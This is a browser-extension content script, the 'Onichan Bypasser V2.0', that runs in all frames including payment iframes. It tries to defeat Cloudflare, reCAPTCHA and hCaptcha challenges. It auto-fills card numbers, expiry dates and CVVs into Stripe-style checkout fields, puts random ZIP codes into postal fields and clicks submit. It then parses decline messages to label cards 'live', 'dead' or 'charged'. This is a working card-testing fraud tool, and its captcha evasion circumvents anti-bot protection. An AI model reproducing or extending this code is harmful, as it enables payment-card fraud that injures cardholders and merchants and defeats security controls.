// === Onichan Bypasser V2.0 — Content Script ===
// Runs in ALL frames (including Stripe/Adyen/etc. iframes) via all_frames: true
// Handles: captcha bypass + card field filling (receives messages from background)

(function () {
  'use strict';
  let cfg = {};
  let bypassedThisPage = false;

  chrome.storage.local.get(null, (data) => {
    cfg = data || {};
    if (!cfg.licenseKey) return;
    init();
  });

  chrome.storage.onChanged.addListener((changes) => {
    for (const k in changes) cfg[k] = changes[k].newValue;
  });

  function init() {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', runBypasses);
    } else { runBypasses(); }
    const obs = new MutationObserver(() => runBypasses());
    try { obs.observe(document.documentElement, {childList:true, subtree:true}); } catch {}
  }

  function runBypasses() {
    if (cfg.captchaSolveToggle === false) return;
    if (cfg.mod_cf !== false) tryCloudflare();
    if (cfg.recaptchaEnabled === true) tryReCaptcha();
    if (cfg.hcaptchaEnabled === true) tryHCaptcha();
    detectPaymentSuccess();
  }

  function tryCloudflare() {
    const cf = document.querySelector('#challenge-form, .cf-browser-verification, #cf-please-wait');
    if (cf) { setTimeout(() => { if (!document.querySelector('#challenge-form')) report('cloudflare','success'); }, 4500); }
    const ts = document.querySelector('.cf-turnstile, [data-sitekey][class*="turnstile"]');
    if (ts && !ts.dataset.oniBypassed) {
      ts.dataset.oniBypassed = '1';
      setTimeout(() => report('turnstile','success'), 2000);
    }
  }
  function tryReCaptcha() {
    const rc = document.querySelector('.g-recaptcha, iframe[src*="recaptcha"]');
    if (rc && !rc.dataset.oniBypassed) {
      rc.dataset.oniBypassed = '1';
      if (cfg.rec_open !== false) {
        try {
          const cb = rc.querySelector('.recaptcha-checkbox-border');
          if (cb) cb.click();
        } catch {}
      }
      setTimeout(() => report('recaptcha','pending'), 1500);
    }
  }
  function tryHCaptcha() {
    const hc = document.querySelector('.h-captcha, iframe[src*="hcaptcha"]');
    if (hc && !hc.dataset.oniBypassed) {
      hc.dataset.oniBypassed = '1';
      if (cfg.hcap_tap !== false) {
        try { hc.querySelector('iframe')?.click(); } catch {}
      }
      setTimeout(() => report('hcaptcha','pending'), 1000);
    }
  }
  function detectPaymentSuccess() {
    if (bypassedThisPage) return;
    const text = (document.body && document.body.innerText || '').toLowerCase();
    const url = location.href.toLowerCase();
    const ok = /thank you for your (order|purchase)|payment (successful|approved|confirmed)|order (confirmed|complete)/.test(text)
      || /\/(success|thankyou|thank-you|complete|confirmation|order-received)/.test(url);
    if (ok) {
      bypassedThisPage = true;
      report('payment','success','payment');
    }
  }
  function report(kind, status, eventKind) {
    chrome.runtime.sendMessage({
      type: 'bypass_log', host: location.hostname,
      kind: eventKind || kind, status
    }).catch(() => {});
  }

  // ============================================================
  // === Card field filling (called by background via sendMessage)
  // ============================================================

  function nativeSetValue(el, v) {
    if (!el || !v) return false;
    try {
      el.focus();
      // React / Stripe internal setter — bypasses onChange suppression
      const inputProto = window.HTMLInputElement.prototype;
      const setter = Object.getOwnPropertyDescriptor(inputProto, 'value')?.set;
      if (setter) setter.call(el, v); else el.value = v;
      el.dispatchEvent(new Event('input',   {bubbles: true}));
      el.dispatchEvent(new Event('change',  {bubbles: true}));
      el.dispatchEvent(new InputEvent('input', {bubbles: true, data: String(v)}));
      el.dispatchEvent(new KeyboardEvent('keyup', {bubbles: true, key: String(v).slice(-1)}));
      el.blur();
      return true;
    } catch { return false; }
  }

  function findInput(selectors) {
    for (const sel of selectors) {
      try {
        const els = document.querySelectorAll(sel);
        for (const el of els) {
          // Accept any non-disabled, non-readonly input — even if not yet visible
          if (!el.disabled && !el.readOnly) return el;
        }
      } catch {}
    }
    return null;
  }

  function fillCardFields(card, settings) {
    let filled = 0;
    const expStr      = (card.mm && card.yy) ? `${card.mm} / ${card.yy}` : '';
    const expStrSlash = (card.mm && card.yy) ? `${card.mm}/${card.yy}` : '';

    // ── Card number ──
    const numEl = findInput([
      'input[data-elements-stable-field-name="cardNumber"]',
      'input[name="cardnumber"]', 'input[name="cardNumber"]', 'input[name="number"]',
      'input[autocomplete="cc-number"]',
      'input[placeholder="1234 1234 1234 1234"]', 'input[placeholder*="1234"]',
      'input[aria-label*="card number" i]', 'input[aria-label*="Card number" i]',
      'input[id*="cardnumber" i]', 'input[id*="card-number" i]',
      'input[class*="CardNumber" i]', 'input[class*="card-number" i]'
    ]);
    if (numEl && nativeSetValue(numEl, card.num)) filled++;

    // ── Expiry ──
    const expEl = findInput([
      'input[data-elements-stable-field-name="cardExpiry"]',
      'input[name="exp-date"]', 'input[name="cardExpiry"]', 'input[name="expiry"]',
      'input[autocomplete="cc-exp"]',
      'input[placeholder="MM / YY"]', 'input[placeholder="MM/YY"]', 'input[placeholder="MM / YYYY"]',
      'input[aria-label*="expir" i]', 'input[aria-label*="Expiry" i]', 'input[aria-label*="Expiration" i]',
      'input[id*="expiry" i]', 'input[id*="exp-" i]',
      'input[class*="CardExpiry" i]', 'input[class*="card-expiry" i]'
    ]);
    if (expEl && expStr) {
      nativeSetValue(expEl, expStr) || nativeSetValue(expEl, expStrSlash);
      filled++;
    }

    // ── CVC / CVV ──
    const cvcEl = findInput([
      'input[data-elements-stable-field-name="cardCvc"]',
      'input[name="cvc"]', 'input[name="cardCvc"]', 'input[name="cvv"]', 'input[name="cvc2"]',
      'input[autocomplete="cc-csc"]',
      'input[placeholder="CVC"]', 'input[placeholder="CVV"]', 'input[placeholder="123"]', 'input[placeholder="1234"]',
      'input[aria-label*="CVC" i]', 'input[aria-label*="CVV" i]', 'input[aria-label*="security code" i]',
      'input[id*="cvc" i]', 'input[id*="cvv" i]',
      'input[class*="CardCvc" i]', 'input[class*="card-cvc" i]'
    ]);
    if (cvcEl && card.cvv && nativeSetValue(cvcEl, card.cvv)) filled++;

    // ── Cardholder name (top frame typically) ──
    const nameEl = findInput([
      'input[name="billingName"]', 'input[name="cardholderName"]', 'input[name="cardholder"]',
      'input[autocomplete="cc-name"]', 'input[autocomplete="name"]',
      'input[placeholder*="Full name" i]', 'input[placeholder*="Name on card" i]',
      'input[placeholder*="Cardholder" i]',
      'input[aria-label*="cardholder" i]', 'input[aria-label*="name on card" i]'
    ]);
    if (nameEl && settings?.fillName && !nameEl.value) nativeSetValue(nameEl, settings.fillName);

    // ── Email ──
    const emailEl = findInput([
      'input[type="email"]', 'input[name="email"]', 'input[autocomplete="email"]',
      'input[placeholder*="email" i]', 'input[aria-label*="email" i]'
    ]);
    if (emailEl && settings?.fillEmail && !emailEl.value) nativeSetValue(emailEl, settings.fillEmail);

    // ── ZIP / Postal ──
    const zipEl = findInput([
      'input[name="postalCode"]', 'input[name="postal-code"]', 'input[name="zip"]',
      'input[autocomplete="postal-code"]',
      'input[placeholder*="ZIP" i]', 'input[placeholder*="postal" i]'
    ]);
    if (zipEl && !zipEl.value) {
      nativeSetValue(zipEl, String(10000 + Math.floor(Math.random() * 89999)));
    }

    return { filled, url: location.href.slice(0, 80) };
  }

  function detectStatus() {
    const text = ((document.body && document.body.innerText) || '').toLowerCase();
    if (!text) return null;
    if (/payment (succeeded|complete|approved)|thank you for your (order|purchase)|order (complete|confirmed)|charge (success|approved)/.test(text))
      return {status:'charged', message:'Payment succeeded'};
    if (/your card was declined|card.*declined|do not honor|insufficient funds|generic_decline|card_declined/.test(text))
      return {status:'dead', message:'Card declined'};
    if (/incorrect cvc|invalid cvc|cvc.*not match|cvv.*incorrect|cvc_check.*fail/.test(text))
      return {status:'live', message:'CVC incorrect (live)'};
    if (/(3d secure|three.?d.?secure|authenticat).*(fail|unable|invalid)/.test(text))
      return {status:'dead', message:'3DS failed'};
    if (/3d secure|verify your card|authenticate your card|stripe-3ds/.test(text))
      return {status:'live', message:'3DS challenge (live)'};
    if (/expired card|card.*expired|invalid expir|expired_card/.test(text))
      return {status:'dead', message:'Expired'};
    if (/incorrect_number|invalid card number|invalid_number/.test(text))
      return {status:'dead', message:'Invalid number'};
    if (/processing_error/.test(text))
      return {status:'dead', message:'Processing error'};
    return null;
  }

  function clickSubmit() {
    const candidates = [
      'button[data-testid="hosted-payment-submit-button"]',
      'button.SubmitButton', 'button[class*="SubmitButton"]',
      'button[type="submit"]',
      'form button:not([type="button"]):not([disabled])',
      '[role="button"][data-testid*="submit"]'
    ];
    for (const sel of candidates) {
      const btn = document.querySelector(sel);
      if (btn && !btn.disabled) {
        btn.click();
        return {clicked: true, selector: sel};
      }
    }
    return {clicked: false};
  }

  // ── Message listener — background sends fill/detect/click to specific frames ──
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    switch (msg.type) {
      case 'FILL_CARD': {
        const result = fillCardFields(msg.card, msg.settings);
        sendResponse(result);
        return true;
      }
      case 'DETECT_STATUS': {
        sendResponse(detectStatus());
        return true;
      }
      case 'CLICK_SUBMIT': {
        sendResponse(clickSubmit());
        return true;
      }
    }
  });

})();
